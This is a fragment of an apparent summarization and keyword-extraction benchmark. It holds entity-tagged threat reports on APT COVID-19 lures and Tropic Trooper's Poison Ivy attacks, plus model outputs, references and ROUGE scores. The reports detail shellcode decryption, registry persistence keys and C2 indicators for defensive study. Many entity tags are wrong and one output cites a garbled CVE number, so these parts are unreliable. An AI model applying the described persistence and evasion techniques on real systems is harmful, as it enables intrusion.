object type within makes RTF files vulnerable to many [ORG] OLE objects related vulnerabilities . Several threat actors , especially [NORP] Chinese ones , use [ORG] RTF files in their campaigns . Among them are the [ORG] Calypso group and [ORG] Winnti threat actors who have used [ORG] RTF files in their [PERSON] COVID-19 campaigns . In this campaign , the [ORG] RTF file exploits the equation editor vulnerability to drop \u201c intel.wll \u201d into the \u201c AppData/ Roaming / [ORG] Microsoft / [ORG] Word / STARTUP/ \u201d directory ( Figure [CARDINAL] 27 ) . \u201c intel.wll \u201d is then executed each time the Microsoft Word application is launched . This [ORG] DLL downloads additional payloads , including a backdoor with several capabilities , such as taking screen shots , executing new processes , or collecting system information . [ORG] Calypso [ORG] Group [ORG] Calypso is a [NORP] Chinese [ORG] APT group that has been performing cyber espionage operations since [DATE] 201618 , [DATE] 19 . The group has targeted governments in [GPE] Brazil , [GPE] India , [GPE] Kazakhstan , [GPE] Russia , [GPE] Thailand , [GPE] Belarus , [GPE] Mongolia , and [GPE] Turkey . In the new campaign , called [ORG] Vicious [ORG] Panada , [ORG] Calypso [ORG] Group has targeted the [NORP] Mongolian public sector by sending malicious [ORG] RTF files to victims disguised as [PERSON] COVID-19 related documents20.The [ORG] RTF file has been weaponized with [FAC] the [FAC] Royal [FAC] Road RTF weaponization tool . The tool is known to be used by several [NORP] Chinese actors and has the capability to embed objects within [ORG] RTF files that exploit vulnerabilities related to [ORG] Microsoft [ORG] Equation Editor . ( CVE-2017 - 11882 , CVE-2018 - 0798 , CVE-2018 - 0802)21.Figure [CARDINAL] 28 : [ORG] RTF file embedding k.dll20Looking at [ORG] the [ORG] Equation [ORG] Native [ORG] Stream , we can see that this [ORG] DLL is made persistent by using the run registry key \u201c Microsoft\\Windows\\CurrentVersion\\Run \u201d ( Figure [CARDINAL] 29 ) . In this case , \u201c k.dll \u201d is executed each time the system reboots . Figure [CARDINAL] 29 : Equation native streamA code similarity check between \u201c k.dll \u201d and \u201c intel.wll \u201d showed that both have similar functionalities and the same exported function named \u201c [NORP] Engdic\u201d . [NORP] Chinese actor ( [ORG] Winnti ) Another [NORP] Chinese threat actor that used the Royal Road weaponization framework with a COVID-19 theme recently dropped a backdoor variant named [PERSON] Chinoxy by exploiting the equation editor [PERSON] vulnerability22 , [CARDINAL] 23 . Some evidence suggests that [ORG] Winnti is the actor behind this campaign , but we can not confirm it22 , [DATE] 24 , [MONEY] 25.21Malicious [MONEY] LNK files [ORG] LNK files are shortcut files used by [ORG] Microsoft [PRODUCT] Windows . They are considered a [ORG] Shell item type that can be executed . From [DATE] 2013 on , attackers have used malicious [ORG] LNK files to infect their victims . A few APTs started using malicious LNK with COVID-19 themes from [DATE] late [DATE] February to mid - [DATE] March to ensnare victims . [PERSON] Mustang [PERSON] Panada [PERSON] Mustang [PERSON] Panda is a [NORP] Chinese threat actor that has targeted NGOs ( non - government organizations ) since [DATE] 2017 . The group \u2019s main targets are [GPE] US think tanks and NGO organizations in [GPE] Mongolia . [PERSON] Mustang [PERSON] Panda uses spear phishing emails to initiate its attacks and usually drops either [ORG] Poison Ivy or the PlugX RAT26 , [CARDINAL] 27.In their [PRODUCT] COVID-19 phishing campaign , [PERSON] Mustang [PERSON] Panda sent an [ORG] LNK file containing a malicious [ORG] HTA application , which contained a VB script ( Figure [CARDINAL] 30).Figure [CARDINAL] 30 : [ORG] HTA fileAPTs and [PERSON] COVID-19 : How advanced persistent threats use the coronavirus as a lure22 [CARDINAL] 2222In the properties of this [ORG] LNK file , there is a command that will be executed when the file is opened ( Figure [DATE] 31).Figure [DATE] 31 : [ORG] CommandThe command calls \u201c mshta.exe \u201d to execute the [ORG] HTA application that drops and runs a payload . The payload has a resource that is dropped in the victim \u2019s machine . The final payload in this campaign is either a variant of PlugX RAT or [PERSON] Cobalt [PERSON] Strike . [ORG] Higaisia [ORG] Anomali has reported another threat group called [GPE] Higaisia using malicious [ORG] LNK files to perform malicious operations using COVID-19 themes . The actor sends an [ORG] LNK file disguised as a [ORG] PDF via spam campaigns . After opening the [ORG] LNK file , an actual [ORG] PDF file is opened28.It is assumed that the group behind this campaign is a [NORP] North [NORP] Korean actor targeting [LANGUAGE] English speaking people/ organizations28.Opening the [ORG] LNK file leads to execution of the command embedded in the property section ( Figure [CARDINAL] 32 ) . The command decodes an embedded base64 payload and drops it into the victim \u2019s machine . The dropped payload is a cabinet file that contains multiple files . The content of the cabinet file is extracted using the legitimate [PRODUCT] Windows executable \u201c extract.exe \u201d . From there , multiple stages are executed and finally , a variant of the PlugX RAT is dropped . Figure [CARDINAL] 32 : CommandAPTs and [PERSON] COVID-19 : How advanced persistent threats use the coronavirus as a lure23 2323Conclusion In this report , we provided an overview of various [ORG] APT groups using the [PRODUCT] COVID-19 pandemic as a theme in several different types of malicious campaigns to increase the odds of their attacks \u2019 success . This shows that threat actors are closely monitoring public events happening around the world , and quickly employing those themes in attack vectors to take advantage of the opportunity . We expect that in [DATE] the [DATE] coming [DATE] weeks and [DATE] months , [ORG] APT threat actors will continue to leverage this crisis to craft phishing campaigns using social engineering techniques and other malicious tactics embedded into lure documents to compromise their targets . [ORG] The [ORG] Malwarebytes [ORG] Threat [ORG] Intelligence team is monitoring the threat landscape and paying particular attention to attacks trying to abuse the public \u2019s fear of the COVID-19 crisis . Our business and consumer customers are protected from these attacks and more , thanks to our multi - layered detection engines . For more information about the threat landscape or how our products thwart advanced attacks , feel free to get in touch with us at intel@malwarebytes.com . Sources1 . [ Online ] . Available : url abstracts / kimsuky - group - tracking - king - spear - phishing . [CARDINAL] 2 . [ Online ] . Available : url intelligence / cve-2017 - 0199 - new - malware - abuses - powerpoint - slide - show/. [CARDINAL] 3 . [ Online ] . Available : url gamaredon - like - fancy - bear - and - cozy - bear - steps - up - cyberattacks - against- ukraine - others/. 4 . [ Online ] . Available : url [CARDINAL] 5 . [ Online ] . Available : url [CARDINAL] 6 . [ Online ] . Available : url under-radar-for-years.html . [CARDINAL] 7 . [ Online ] . Available : url apt36 - jumps - on - the - coronavirus - bandwagon - delivers - crimson - rat/. [CARDINAL] 8 . [ Online ] . Available : url 9 . [ Online ] . Available : url [CARDINAL] 10 . [ Online ] . Available : url of - global - outbreak - related - cyber - attacks/. 11 . [ Online ] . Available : url actor - profile - ta505 - dridex - globeimposter . [CARDINAL] 12 . [ Online ] . Available : url threat - actor - profile - ta542 - banker - malware - distribution - service . [CARDINAL] 13 . [ Online ] . Available : url fears - seized - by - cybercriminals . [CARDINAL] 14 . [ Online ] . Available : url continues - targeting - government - of - china - and - chinese - organizations.15 . [ Online ] . Available : url [CARDINAL] 16 . [ Online ] . Available : url [CARDINAL] 17 . [ Online ] . Available : url [CARDINAL] 18 . [ Online ] . Available : url [CARDINAL] 2019/#id1 . [CARDINAL] 19 . [ Online ] . Available : url group . [CARDINAL] 20 . [ Online ] . Available : url covid - campaign/. 21 . [ Online ] . Available : url royal-road.html . [CARDINAL] 22 . [ Online ] . Available : url chinoxy . [CARDINAL] 23 . [ Online ] . Available : url backdoor - using - covid19 - document - lure-83fa294c0746 . [CARDINAL] 24 . [ Online ] . Available : url [CARDINAL] 25 . [ Online ] . Available : url updates . [CARDINAL] 26 . [ Online ] . Available : url [CARDINAL] 27 . [ Online ] . Available : url [CARDINAL] 28 . [ Online ] . Available : url being - utilized - by - threat - actors - of - varying - sophistication . [GPE] Malwarebytes is a cybersecurity company that [CARDINAL] millions worldwide trust . [GPE] Malwarebytes proactively protects people and businesses against malicious threats , including ransomware , that traditional antivirus solutions miss . The company \u2019s flagship product uses signature - less technologies to detect and stop a cyberattack before damage occurs . [ORG] Learn more at www.malwarebytes.com .", "generated_text": "APT; phishing emails; malware; use; spear; phishing emails; spear phishing emails; CVE-2017-01992; remote code execution; victims; macros; Microsoft Office; macros; RTF exploits; Calypso Group; Chinese; Winnti; Mustang Panada; the group; Kalypso; Mustang Panada; the coronavirus; the threat actor; the email; C2; the malware; victims; information; a command; control; actors; the risk; malware; the coronavirus; a lure; the threat actor; tactics; techniques; the threat actor.", "ref_text": "<START-1>The white paper provides an overview of how various advanced persistent threat (APT) groups have been using the COVID-19 pandemic as a lure in cyberattacks. It categorizes the techniques used by these groups into four main types: template injection, malicious macros, RTF exploits, and malicious LNK files. Template injection refers to embedding a script in a document that fetches a remote malicious template. Groups like Kimsuky and Gamaredon have used COVID-19 themed documents with template injection to target victims. The malicious templates typically contain macros that collect system information and exfiltrate it. Embedding malicious macros directly in documents has been the most common technique. Groups like Kimsuky, Konni, APT36, Patchwork, Hades, TA505, TA542, Bitter, and Ocean Lotus have used macro-enabled COVID-19 themed documents that drop malware like remote access Trojans after being opened. The macros are usually obfuscated and decrypt malicious payloads. Some Chinese groups have used COVID-19 themed RTF files exploiting the equation editor vulnerability to drop backdoors. Calypso group and Winnti are examples of actors using this technique recently. Malicious LNK files have also been observed in campaigns by groups like Mustang Panda and Higaisia. Opening the LNK file leads to execution of the command embedded in the property section, which decodes an embedded base64 payload and drops it into the victim's machine. The dropped payload is a cabinet file that contains multiple files, and content is extracted using the legitimate Windows executable \"extract.exe\".The LNK files link to scripts that eventually drop remote access Trojans. In summary, the white paper provides an overview of how various sophisticated threat actors have quickly adopted COVID-19 themes and current events in their social engineering tactics and cyberattacks. Their techniques involve using the pandemic crisis as a lure in phishing emails and weaponized documents that infect systems with malware like remote access Trojans upon opening. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.47131147540983614, "gpt3/lexical/rouge_rouge2": 0.1358024691358025, "gpt3/lexical/rouge_rougeL": 0.2581967213114754, "gpt3/lexical/rouge_rougeLsum": 0.2581967213114754, "gpt3_generated_text": ["This article discusses how advanced persistent threat (APT) groups are using the COVID-19 pandemic as a lure to carry out cyberattacks. These threat actors are sending phishing emails with COVID-19-related content to increase the chances of successful attacks. The article categorizes APT groups based on the techniques they use, including template injection, malicious macros, RTF exploits, and malicious LNK files. It provides examples of APT groups such as Kimsuky, Gamaredon, and Winnti, and describes their specific attack vectors. The article highlights the use of template injection by Kimsuky, a North Korean group, which targets Korean think tanks and US firms. The group sends spear phishing emails with COVID-19 in the subject line and exploits a vulnerability (CVE-2017-01992) in Microsoft Office to deliver malware. The article explains the process of how the malware is executed and the information it collects. Overall, the article emphasizes the increased risk of cyberattacks during the COVID-19 pandemic and the importance of being vigilant against phishing emails and other malicious tactics used by APT groups."]}, {"split_name": "val", "sample_id": "val_23", "prompt_text": "Extract the keywords: [ORG] MENUBlog [ORG] Home [ORG] > [ORG] Unit 42 > Tropic Trooper Targets Taiwanese Government and [PERSON] Fossil [PERSON] Fuel [PERSON] Provider With Poison IvyTropic IvyBy [PERSON] Vicky [PERSON] Ray , [PERSON] Robert [PERSON] Falcone , [PERSON] Jen Miller [PERSON] - Osborn and [PERSON] Tom [PERSON] Lancaster [DATE] November 22 , [DATE] 2016 at [TIME] 3:30 [TIME] AM [TIME] Category : Unit 42 Tags : [ORG] APAC , [ORG] Poison Ivy , [GPE] Taiwan , threat research , [GPE] Tropic Trooper305(3)Taiwan has been a regular target of cyber espionage threat actors for [DATE] a [DATE] number [DATE] of [DATE] years . Reasons for [GPE] Taiwan being targeted range from being one of the sovereign states of the disputed [LOC] South [LOC] China [LOC] Sea region to its emerging economy and growth with [GPE] Taiwan being one of the most innovative countries in the High - Tech industry in [LOC] Asia . In [DATE] early [DATE] August , Unit [CARDINAL] 42 identi\ufb01ed [CARDINAL] two attacks using similar techniques . The more interesting one was a targeted attack towards the Secretary General of   Taiwan \u2019s Government o\ufb03ce \u2013 Executive Yuan . [ORG] The [ORG] Executive [ORG] Yuan has several individual boards which are formed to enforce di\ufb00erent executing     functions of the government . [ORG] The [ORG] Executive [ORG] Yuan [ORG] Council evaluates statutory and budgetary bills and bills concerning martial law , amnesty , declaration of war , conclusion of peace and treaties , and other important a\ufb00airs . Given the important functions undertaken by [ORG] the [ORG] Executive [ORG] Yuan o\ufb03ce , it is not a     surprise that they were targeted . The [ORDINAL] second attack was against an energy sector company also located in [GPE] Taiwan . The attacks in this case are associated with a campaign called [ORG] Tropic [ORG] Trooper , which has been active since [CARDINAL] at [CARDINAL] least [CARDINAL] 2011 and is known for heavily targeting [GPE] Taiwan . [CARDINAL] One of the attacks used their known [GPE] Yahoyah malware , but the other attack deployed the widely available [ORG] Poison Ivy RAT . This con\ufb01rms the actors are using [ORG] Poison Ivy as part of their toolkit , something speculated in the original [ORG] Trend [ORG] Micro report but not con\ufb01rmed by them .    Further analysis uncovered a handful of ties indicating the actors may also be using the [ORG] PCShare malware family , which has not been previously tied to the group . Figure [CARDINAL] 1 shows the spear phishing email which was sent to the Secretary General of Executive Yuan . The email is spoofed so that it appears as though it was sent from a sta\ufb00 member at [ORG] the [ORG] Democratic [ORG] Progressive [ORG] Party ( [ORG] DPP ) . Figure The document attached to this e - mail exploits CVE-2012 [CARDINAL] - 0158 , a [ORG] Microsoft [ORG] O\ufb03ce vulnerability . This process is described in the [PERSON] Malware [PERSON] Analysis    section later in this report , but [CARDINAL] one interesting aspect of this malicious was the decoy document the attacker chose to deploy . Decoy Document As we have noted in many earlier reports , attackers commonly use decoy \ufb01les to trick victims into thinking a malicious document is actually legitimate .   After infecting the computer , the display a clean document to the victim that contains content that is relevant to them . The decoy document used in this case is a spreadsheet with [CARDINAL] four tabs , respectively titled \u201c example , \u201d \u201c [DATE] 0720 , \u201d \u201c 0721 , \u201d and \u201c [DATE] 1041109 full update \u201d . All of the text uses [NORP] Traditional [NORP] Chinese , in contrast to [NORP] Simpli\ufb01ed [NORP] Chinese , which is the o\ufb03cial written language of [GPE] the People \u2019s [GPE] Republic [GPE] of [GPE] China . Traditional     [NORP] Chinese is used in [GPE] Taiwan , [GPE] Hong [GPE] Kong , [GPE] Macau , and many overseas [NORP] Chinese communities . The overarching theme of the spreadsheet is documenting protestor activity and/or progressive reform attempts in progress across [GPE] Taiwan and the tone of the spreadsheet suggests it was compiled by progressive supporters . Because we were unable to \ufb01nd the spreadsheet online , and there is speci\ufb01c persona data included related to these movements   and protests , we are not including any screen shots except for the one below . Figure The \u201c example \u201d spreadsheet tab is exactly as described \u2013 it contains the headers and suggested information within [CARDINAL] two of the remaining [CARDINAL] three tabs . The headers themselves translate , from left to right , to \u201c responsible department , \u201d \u201c issue , \u201d \u201c developments [DATE] this [DATE] week , \u201d \u201c political situation judgment , \u201d and \u201c related information . \u201d The tab labeled [CARDINAL] 0721 only has the matching headers and no additional information . None of the information in the spreadsheet relates to activities past [DATE] 2015 , and there are references made to the then upcoming [DATE] January 16 , [DATE] 2016 elections in [GPE] Taiwan . In that election the [ORG] DPP won , displacing [ORG] the [ORG] Chinese [ORG] Nationalist [ORG] Party ( [ORG] KMT ) for only the [ORDINAL] second time in history , and with [GPE] Taiwan \u2019s \ufb01rst female President .   The spreadsheet labeled [DATE] 0720 refers to [ORG] the Anti [ORG] - Black [ORG] Box [ORG] Movement , which was a protest by [NORP] Taiwanese high school students against certain proposed curriculum changes . The use of \u201c black box \u201d by the protestors is in reference to former [NORP] Taiwanese President [PERSON] Ma Ying [PERSON] - Jeou \u2019s government and its lack of transparency concerning government decisions . Protestors occupied [ORG] Taiwan \u2019s [ORG] Ministry [ORG] of [ORG] Education [DATE] last [DATE] July . A resolution passed by [GPE] Taiwan \u2019s legislature and approved by [ORG] the [ORG] Executive [ORG] Yuan in [DATE] May [DATE] of [DATE] this [DATE] year delayed implementing that curriculum until [DATE] 2020 to allow time for the act to be amended . The Anti - Black Box Movement is related to [ORG] the [ORG] Sun\ufb02ower [ORG] Student [ORG] Movement , a coalition of both student groups and other civic organizations that   protested [ORG] the Cross [ORG] - Strait [ORG] Trade [ORG] Agreement between [GPE] Taiwan and the [GPE] PRC , feeling it would hurt [GPE] Taiwan \u2019s economy and increase the [GPE] PRC \u2019s sway over the island . On [DATE] March [DATE] 17 [DATE] 2014 , the [ORG] KMT , the ruling party at the time , tried to force a vote without a previously agreed clause by clause review with the [ORG] DPP . The following [TIME] evening protesters occupied [ORG] the [ORG] Legislative [ORG] Yuan , the \ufb01rst time that had occurred [GPE] Taiwan \u2019s history . On [DATE] March [DATE] 23 [DATE] of [DATE] the [DATE] same [DATE] year , after   then President [PERSON] Ma re - a\ufb03rmed he supported the pact and would not alter or drop it , protestors occupied [ORG] the [ORG] Executive [ORG] Yuan where [CARDINAL] over [CARDINAL] 150 were injured    and [CARDINAL] 61 arrested . The \ufb01nal tab contains the most information of the [CARDINAL] three and has di\ufb00erent headers . From left to right , the headers are titled \u201c responsible person(s ) , \u201d    \u201c summary of issues and major groups , \u201d \u201c crisis simulation , political judgment , and recommendations , \u201d \u201c degree of tension , \u201d and \u201c participating members . \u201dInformation related to the [DATE] November [DATE] 2015 \u201c [WORK_OF_ART] Autumn [WORK_OF_ART] Struggle \u201d protest , which is an annual protest \ufb01rst done in [DATE] 2013 .   Information on a [GPE] Taichung [GPE] City government development proposal being protested largely on environmental impact grounds , and protestor [ORG] Army [ORG] 1 [ORG] Special [ORG] Forces veterans attempt to receive compensation for alleged illegal extension of forced military service The recently settled case where toll workers forced into unemployment by the [NORP] Taiwanese government \u2019s agreement with [ORG] the [ORG] Far [ORG] Eastern [ORG] Electronic [ORG] Toll [ORG] Collection [ORG] Company to create a national electronic toll collection system ended up resulting in the [DATE] 2013 layo\ufb00s of [CARDINAL] hundreds , who have since   protested for new jobs as well as lost severance and pension . [GPE] Kaohsiung re\ufb01nery closing and protestor demands , also largely related to environmental e\ufb00ects and necessary cleanup ; the re\ufb01nery o\ufb03cially closed       at [DATE] the [DATE] end [DATE] of [DATE] December [DATE] 2015 Closely watching any trade agreements between the [NORP] Malaysian government and [ORG] Taiwan [ORG] Potential environmental and current residential issues related to the development of the [NORP] Aerotropolis around [FAC] Taoyuan [FAC] International [FAC] Airport , which is intended to create a major transportation hub and industry center for [LOC] Asia with infrastructure for corporate research and development , conference centers , and other facilities . [ORG] The [ORG] Puyu [ORG] Development [ORG] Plan , which is part of [GPE] Taiwan \u2019s [GPE] Knowledge - based Economy plan [GPE] Taiwan \u2019s 12 [DATE] - [DATE] year compulsory education plan Anti [ORG] - Black [ORG] Box [ORG] Movement demands and recent activity Improving working conditions for [NORP] Taiwanese \ufb01re\ufb01ghters    Pension reforms [ORG] The [ORG] Nest [ORG] Movement , which started in [DATE] 2014 and is related to the older \u201c Shell - less [ORG] Snail [ORG] Movement , \u201d focused on a\ufb00ordable housing , neighborhood   and urban development , ending forced demolition and relocation , property tax reform , and related housing issues [WORK_OF_ART] The [WORK_OF_ART] Environmental [WORK_OF_ART] Impact [WORK_OF_ART] Assessment [WORK_OF_ART] ( EIA ) voted on by [ORG] the [ORG] Environmental [ORG] Protection [ORG] Bureau ( [LOC] EPB ) for [ORG] the Dongshi [ORG] - Fengyuan [ORG] Expressway , part of [ORG] the [ORG] National [ORG] Highway # [ORG] 4 [ORG] Project and anti - eviction e\ufb00orts   [GPE] Kaohsiung water quality issues and related projects Same sex marriage legalization [ORG] Protecting old trees in [GPE] Kaohsiung amidst construction for a new \u201c green \u201d library ; most of the designated \u201c precious trees \u201d are rare exotic species Indigenous peoples in [GPE] Kaohsiung land return Activities against [ORG] the [ORG] Miramar [ORG] Resort [ORG] Village , including the revocation of the EIA , forcing development to halt Lowering the voting age in [GPE] Taiwan from [CARDINAL] 20 [CARDINAL] to [CARDINAL] 18Malware Analysis The documents attached to spear - phishing e - mails used in both attacks contain code that exploits CVE-2012 - 0158 , which despite its age remains one of the most common [ORG] Microsoft [ORG] Word vulnerabilities being exploited by multiple threat actors . This matches with known [ORG] Tactics , Techniques , and [PERSON] Procedures ( TTPs ) for [ORG] Tropic [ORG] Trooper , targeting both government institutions and also the energy industry in [GPE] Taiwan . The delivery document uses the XLSX extension typically used by OpenXML documents , but the \ufb01le itself is actually an [ORG] OLE ( [ORG] XLS ) document . The \ufb01le    extension to \ufb01le type discrepancy was caused by the actor using Excel \u2019s built - in encryption capability , which stores XLSX ciphertext and the information   needed for decryption in an [ORG] OLE document . Filename : [CARDINAL] \u2f2f .xlsx Type : [PRODUCT] CDF [PRODUCT] V2 [PRODUCT] Document , No summary info [PERSON] Size : 327128 bytes The embedded shellcode enumerates open handles for a \ufb01le with a size greater than 0xa6f0 ( Decimal \u2013 42736 ) bytes . It will then set the \ufb01le pointer to    0xa6e8 ( Decimal \u2013 42728 ) and starts looking for the following delimiter : GfCv\\xef\\xfe\\xec\\xceIf it \ufb01nds this delimiter , the shellcode knows it is working with the correct \ufb01le and continues by reading [CARDINAL] 0x600 ( decimal [DATE] 1536 ) bytes following this    delimiter . The shellcode then decrypts the \ufb01rst 0xc0 ( decimal [CARDINAL] 192 ) DWORDs of the data read from the \ufb01le using an XOR algorithm that decrypts one    DWORD of ciphertext at a time with [CARDINAL] 0x29f7c592 . The resulting cleartext is a [ORDINAL] second piece of shellcode that continues carrying out further functionality . The [ORDINAL] secondary shellcode starts by resolving the following API functions using a ROT13 hashing algorithm : [QUANTITY] kernel32.dll!CreateFileA [QUANTITY] kernel32.dll!ReadFile kernel32.dll!WriteFile kernel32.dll!SetFilePointer kernel32.dll!CopyFileA kernel32.dll!MoveFileExA kernel32.dll!CreateToolhelp32Snapshot kernel32.dll!Process32Next kernel32.dll!CloseHandle kernel32.dll!VirtualAlloc kernel32.dll!WinExec kernel32.dll!TerminateProcess kernel32.dll!LoadLibraryA kernel32.dll!lstrlenA [CARDINAL] kernel32.dll!lstrcpyA kernel32.dll!lstrcatA kernel32.dll!GetTempPathA kernel32.dll!WideCharToMultiByte kernel32.dll!QueryDosDeviceA ntdll.dll!NtQueryObject advapi32.dll!RegOpenKeyA advapi32.dll!RegSetValueExA advapi32.dll!RegCloseKey Immediately following these API functions there are [CARDINAL] three DWORDS ; [CARDINAL] one used to locate the payload embedded within the exploit \ufb01le , one for the size of   the payload , and one for the size of decoy document . The [CARDINAL] two size values are added together to get the length of the ciphertext that the shellcode will decrypt . In the sample we analyzed , the following values were present , showing that the payload is at o\ufb00set [DATE] 0xabc0 and has a size of [CARDINAL] 0x45218 :   DWORD o\ufb00set_toPayload ; ( [CARDINAL] 0ABC0h )   [ORG] DWORD payload_Size ; ( [CARDINAL] 1C600h ) DWORD decoy_Size ; ( 28C18h ) The shellcode then creates a string that it uses to create a registry key to automatically run the \ufb01nal payload each time the system starts . It then opens   the registry key \u2018 Software\\Microsoft\\Windows [ORG] NT\\CurrentVersion\\Winlogon \u2019 and sets the value to the \u201c Shell \u201d subkey to the previously created string . Ultimately , the following registry key is created for persistence : HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell : \u201c explorer.exe , rundll32.exe \u201c [MONEY] C:\\Documents [MONEY] and [MONEY] Settings\\Administrator\\Application Data\\Identities\\Identities.ocx \u201d SSSS \u201d It then uses the \u201c o\ufb00set_toPayload \u201d value as an o\ufb00set that it will read [DATE] 283160 ( [DATE] 45218h ) bytes from the [ORG] XLS \ufb01le . The shellcode then enters a decryption     loop to convert the embedded payload from ciphertext to cleartext . The algorithm uses the length of the ciphertext negated as the initial encryption key , which it bit rotates right by [CARDINAL] 1 to adjust the key for each of decryption . It will use this key to decrypt [CARDINAL] four bytes of the ciphertext with the XOR operation until all the ciphertext is decrypted . During each iteration of the decryption process , the algorithm will check to make sure the [CARDINAL] four bytes of ciphertext are not equal to the key or equal to [CARDINAL] zero before decrypting the ciphertext . The following table contains the \ufb01rst \ufb01ve rounds of the algorithm to explain the    Type : Zip archive data , at least v2.0 to extract [PERSON] Size : [DATE] 166936 bytes [WORK_OF_ART] Last [WORK_OF_ART] Modified [WORK_OF_ART] By : [ORG] Windows [ORG] \u2f64 [ORG] Created : [CARDINAL] 2016:07:21 03:15:34Z Type : PE32 executable for MS Windows ( [ORG] DLL ) ( [ORG] GUI ) [ORG] Intel 80386 32 [QUANTITY] - bit [PERSON] Size : [DATE] 116224 bytes Compiled : 2016 - 05 - 23 07:00:51 As you can see from the table above , the algorithm decrypts what is an embedded portable executable that acts as the payload in this attack . The embedded payload is written to % APPDATA\\Identities\\Identities.ocx and has the following attributes : The decoy document , described in the section above , is saved to % TEMP%\\ \u2f2f .xlsx and has the following attributes : The shellcode will move the decoy document to the location of the originally executed XLSX \ufb01le and will create the following command :   cmd /c start excel /e \u201c < path to original XLSX \ufb01le , now decoy   document > \u201d Before running the above command to open the decoy document , the shellcode enumerates the running processes on the system , speci\ufb01cally looking   for processes created for an executable with a \ufb01lename that starts with \u201c avp . \u201d , presumably in an attempt to \ufb01nd Kaspersky \u2019s antivirus process . If the    process is found , the shellcode will not open the decoy document and exits . The shellcode does not launch the payload , rather it relies on the registry key it created for persistence to execute the payload when the user reboots the system , meaning during dynamic analysis the execution of the payload may be missed . Delivered Payload \u2013 Poison Ivy When the system starts up , the persistence registry key will launch the [ORG] Identities.ocx payload and call its \u201c SSSS \u201d exported function . The \u201c SSSS \u201d function checks to make sure that the [ORG] DLL is running within the context of a \u201c rundll32.exe \u201d process and then begins piecing 0x141B bytes of data together in the correct order to build the shellcode of [ORG] the [ORG] Poison [ORG] Ivy [ORG] Trojan . Campaign ID : [ORG] MyUser [ORG] Group ID : MyGroup C2 Cnt : [CARDINAL] 3 - C2 # 1 : [ORG] news.hpc.tw:53 [ORG] - [ORG] C2 # 2 : account.sino.tw:80 Comm Key : twone Mutex : ( [GPE] V!hex67 ) Auto - remove [PERSON] Dropper [PERSON] Flag : 1 Active Setup value name : StubPath Default browser path reg key : SOFTWARE\\Classes\\http\\shell\\open\\command Active Key registry key : Software\\Microsoft\\Active Setup\\Installed [DATE] Components\\We found and parsed the following con\ufb01guration from the [ORG] Poison Ivy shellcode :   Looking for more samples which exhibited the same \ufb01le structure , encryption and obfuscation to deliver the above [ORG] Poison Ivy sample yielded [CARDINAL] only [CARDINAL] two   additional samples . In the other [CARDINAL] two instances the delivered payloads were respectively [ORG] PCShare and [GPE] Yahoyah . [ORG] PCShare has not been previously associated with [ORG] Tropic [ORG] Trooper , but in addition to the aforementioned overlaps , the [CARDINAL] two samples have passive [ORG] DNS overlap with some known [ORG] Tropic [ORG] Trooper infrastructure . For those reasons , we assess with limited con\ufb01dence the group is also using this malware family . Figure The below table shows the details of the documents , payload delivered and the C2 servers used for communications . Filename [ORG] CTC Statement.xlsx belindianlab[.]itemdb[.]com Filename _ .xlsx www[.]dpponline[.]trickip[.]org www[.]myinfo[.]ocry[.]com 223.27.35[.]244It is interesting to see that the exploit documents we found had either low or no detections on most popular antivirus engines , showing that the threatactors behind this campaign have been having considerable success in bypassing static analysis undertaken by traditional antivirus solutions with this technique . We further expanded our search using [ORG] the [ORG] AutoFocus [ORG] Threat [ORG] Intelligence platform on the IOCs extracted from the PIVY , [ORG] PCShare and [GPE] Yahoyah payloads and found [CARDINAL] 42 samples which either matched unique behaviors , the unique PIVY mutex or had common C2 infrastructure . The hashes of all the samples found are given in the appendix section at the end of this blog . Figure [CARDINAL] 4 below shows the compilation timestamps of the payload samples found using [ORG] AutoFocus . Given some of the payloads that were used in recent attacks , which were compiled [DATE] months before , it shows that the threat actor group continues to reuse the payload within their exploit documents . Figure The below [ORG] Maltego graph shows some of the shared infrastructure which have been used by [ORG] Tropic [ORG] Trooper . The complete list of indicators on the graph can also be found in the appendix section of this report . Figure The [ORG] Tropic [ORG] Trooper threat actor group has been known to target governments and organizations in the [LOC] Asia Paci\ufb01c region for [DATE] at [DATE] least [DATE] six [DATE] years . In   addition to using [GPE] Yahoyah malware , we were able to con\ufb01rm they are also using [ORG] Poison Ivy and possibly [ORG] PCShare malware families . They are also still   exploiting CVE 2012 - 0158 , as are many threat actors . [ORG] Palo [ORG] Alto [ORG] Networks customers are protected from [ORG] Tropic [ORG] Trooper \u2019s malicious activities by : [ORG] WildFire correctly identi\ufb01es all related malware as malicious   The C2 infrastructure are classi\ufb01ed as malicious in PAN [ORG] - DB   [ORG] Traps prevents exploitation of CVE-2012 [CARDINAL] - 0158Autofocus customers can discover additional information on [ORG] Tropic [ORG] Trooper via the following [ORG] AutoFocus tags : [ORG] Tropic [ORG] Trooper [ORG] Samples matching unique indicators , behaviors and [CARDINAL] C2 infrastructure from the payload extracted out of the malicious documents : news[.]hpc[.]tw www[.]dpponline[.]trickip[.]org www[.]forensic[.]zyns[.]com www[.]bannered[.]4dq[.]comwww[.]forensic611[.]3 - a[.]net bbs[.]zzbooks[.]net bbs[.]ccdog[.]net wallstreet[.]1dumb[.]com www[.]cham[.]com[.]tw pinkker[.]zzux[.]com www[.]amberisic611[.]4dq[.]com www[.]metacu[.]ygto[.]com bbs[.]zzbook[.]net www[.]myinfo[.]ocry[.]com www[.]gmal1[.]com news[.]hpc[.]tw www[.]dpponline[.]trickip[.]org pinkker[.]zzux[.]com wallstreet[.]1dumb[.]com redpeach[.]youdontcare[.]com redapple[.]justdied[.]com [ORG] stone[.]mypop3[.]org zeus[.]jkub[.]com sniper[.]mynumber[.]org unclesam[.]jungleheart[.]com arora[.]x24hr[.]com \ufb02anando[.]fartit[.]com   www[.]dpponline[.]trickip[.]org www[.]myinfo[.]ocry[.]com belindianlab[.]itemdb[.]com kr[.]dns1[.]usC2 [ORG] hxxp://www[.]dpponline[.]trickip[.]org / images / D2015_id[.]jpg hxxp://223[.]27[.]35[.]244 / images / D2015_id[.]jpg hxxp://www[.]myinfo[.]ocry[.]com / images / D2015_id[.]jpg hxxp://belindianlab[.]itemdb[.]com/1613986301|C7A5398FBD8214C92F6596CC39B8866B0121E53422D6B8378E5D1F5F63844D693810BDED362511ED3630DC4F6A2B1302354C31242753DACB331EF3CF808E4E107B12F103F0C040F87DAA6CAB0676A25EBC673D9DFA078915F93361308E10BB5BA7DF1A90FEB614F1A1F12C7A135B60926A5D49FCE025F577FE0DEE937C803BE27D hxxp://202[.]153[.]193[.]73 / images / 